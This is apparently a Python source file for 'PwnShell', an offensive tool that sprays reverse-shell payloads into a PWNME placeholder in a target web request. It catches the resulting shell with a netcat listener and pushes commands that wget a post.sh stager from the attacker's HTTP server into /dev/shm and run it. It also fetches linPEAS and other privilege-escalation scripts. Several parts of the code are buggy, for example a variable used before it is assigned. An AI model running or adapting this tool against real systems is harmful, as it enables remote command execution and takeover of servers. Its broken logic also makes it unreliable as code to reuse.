#!/usr/bin/env python3
# coding=utf-8
import sys
import base64
import netifaces
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3
import requests
from http.server import HTTPServer, CGIHTTPRequestHandler
import socketserver
import urllib.parse
from payloads import PayLoads
import time
import socket
import burpee


class PwnShell:
    def __init__(self, args):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.ip = ip_address
        self.ip = args.host
        self.port = args.port
        self.domain = args.url
        self.method = args.method
        self.cookie = args.cookie
        self.data = args.data
        self.type = args.type
        self.file = args.file
        self.nodejs = args.nodejs

        ########################################################################
        ###################### Specifying OS ###################################
        if self.type == "linux" or self.type == "l":
            self.shell_linux()
        elif self.type == "windows" or self.type == "w":
            self.shell_windows()
        else:
            print("[!]Invalid Value -> " + self.type)
            exit_gracefully()
        ######################################################################

    def info(self):
        info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL': self.domain, '[*]Method':self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
        for key, value in info.items():
            if value:
                print(f'{key} : {value}')
        print("\n")
    ####################################################################################
    ###################################  LINUX #########################################

    def shell_linux(self):  # Default option
        self.info()
        self.is_valid()
        self.thread()  # leave it the last one

    #########################################################################################
    ###################################  WINDOWS #########################################

    def shell_windows(self):
        print("              ##NOT ADDED YET !!")
        exit_gracefully()

    ######################################################################################
    ##########################  CHECK IF IP & PORT IS VALID ############################

    def is_valid(self):  # Checking if the ip address is valid
        try:
            ipaddress.ip_address(self.ip)
            if self.port <= 65535:
                return True
            else:
                print("[!]Invalid PORT NUMBER -> %d" % self.port)
                exit_gracefully()
        except ValueError:
            print("\n[!]Invalid IP : %d" % self.ip)
            exit_gracefully()

    #########################################################################################
    ##############################  NC LISTNER + STAGER ###################################

    def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
        nc = nclib.Netcat(listen=('', self.port))
        print(f"\n[*]Got Connection From -> [{self.ip}:{self.port}]")
        print("[*]Payload :",self.current_payload)
        print('[*]Uploading Shell Script to [/dev/shm]...')
        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
        time.sleep(3)
        print('[*]Auto Stablizing & Uploading PrivESC Scripts works for [bash/sh] Shells for Now...')
        time.sleep(5)
        nc.send_line(b"export TERM=xterm-256color")
        send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh'''
        nc.send_line(send.encode("utf-8"))
        send = f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
        nc.send_line(send.encode("utf-8"))
        nc.interact()
        nc.close()

    #########################################################################################
    ###################################  HTTP SERVER #########################################

    def http_server(self):
        # Make sure the server is created at current directory
        os.chdir('.')
        # Create server object listening the port 9002
        server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
        # Start the web server
        server_object.serve_forever()

    #########################################################################################
    ###################################  THREADS ############################################

    def thread(self):
        listen = Thread(target=self.listener)
        sendpayload = Thread(target=self.send_payload)
        httpserver = Thread(target=self.http_server)
        if self.file:
            burp = Thread(target=self.parse_file)
            burp.daemon = True
            burp.start()
        listen.daemon = True
        sendpayload.daemon = True
        httpserver.daemon = True
        listen.start()
        sendpayload.start()
        httpserver.start()
        httpserver.join()
        listen.join()
        sendpayload.join()
        if self.file:
            burp.join()

    ############################################################################################
    ###################################  SENDING THE PAYLOADS #################################
    def send_payload(self):
        self.list=[]
        self.iteration=0
        payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
        for payload in payloads:
            self.list.append(payload)
        if not self.file:
                for payload in payloads:
                    self.iteration += 1
                    print(f'[*]Trying payload -> [{self.iteration}/{len(self.list)}]', end='\r')
                    time.sleep(2)  # Change this ASAP !!!
                    self.send_request(payload)

    #########################################################################################
    ###################################  Send The Request #########################################
    def send_request(self, payload):
        if self.domain:
            encoded_payload = self.get_url_encoded_payload(payload)
            url = self.domain.replace('PWNME', encoded_payload)
            #print(url)
            proxies = {'http': 'http://127.0.0.1:8080'}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                       "Upgrade-Insecure-Requests": "1",
                       'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
                
            self.current_payload = encoded_payload  #For output when getting a shell
            if self.cookie:
                cookies = self.cookie
            else:
                cookies =None
            if self.method == 'post' or self.method == 'POST':
                if self.data:
                    data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
                    print("\n[+]Stauts Code ->","["+f'{r.status_code}'+"]")
                else:
                    data_parsed = None
                    r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
            else:
                r = requests.get(url, cookies=cookies, verify=False)                    

    ########################################################################################
    ###################################  PARSER BURPREQUEST #################################
    def parse_file(self):
        payloads = PayLoads(self.ip, self.port).payloads()
        for payload in payloads:
            proxies = {'http': 'http://127.0.0.1:8080'}
            encoded_payload = self.get_url_encoded_payload(payload)
            request, post_data = burpee.parse_request(self.file)  # Don't change
            for r in request:
                if request[r] == "PWNME":
                    request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
                if r == "Host":
                    url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH

            if post_data:
                url = url.replace("PWNME", encoded_payload)
                post_data = post_data.replace("PWNME", encoded_payload)
                req = requests.post(url, headers=request, data=post_data, verify=False)
            else:
                url = url.replace("PWNME", encoded_payload)
                req = requests.get(url, headers=request,verify=False)
                time.sleep(2)

    #########################################################################################
    ###################################  ENCODING PAYLOADS #################################

    @staticmethod
    def get_url_encoded_payload(payload):
        encoded_payload = urllib.parse.quote(payload)
        encoded_payload = encoded_payload.replace('/', '%2F')
        return encoded_payload


def exit_gracefully():
    print("                                   #GOOD BYE!")
    exit()


if __name__ == '__main__':
    try:
        banner = ''' 
                 __    ____                _____ __         ____    __
               _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
              / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
             (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
            /  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
            /_/                                                /_/   V 1.0
                Authors: AbuQasem & AlBalouli
            ##############################################################  
            '''
        print(banner)
        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        try:
            ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
        except:
            ip_address = None
            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
        parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
        parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
        parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
        parser.add_argument("-f", "--file", help='Request file')
        parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
        parser.add_argument("-d", "--data", help='Post data')
        parser.add_argument("-c", "--cookie", help='Enter Cookie')
        parser.add_argument("-k", "--header", help='Provide header')
        parser.add_argument("-m", "--method", help='Request Method',required=True)
        args = parser.parse_args()
        ########################################################################
        ########################## Defining variables ##########################
        pwnshell = PwnShell(args)
        pwnshell.send_payload()
    except KeyboardInterrupt:
        exit_gracefully()

# TODO
# Work on windows
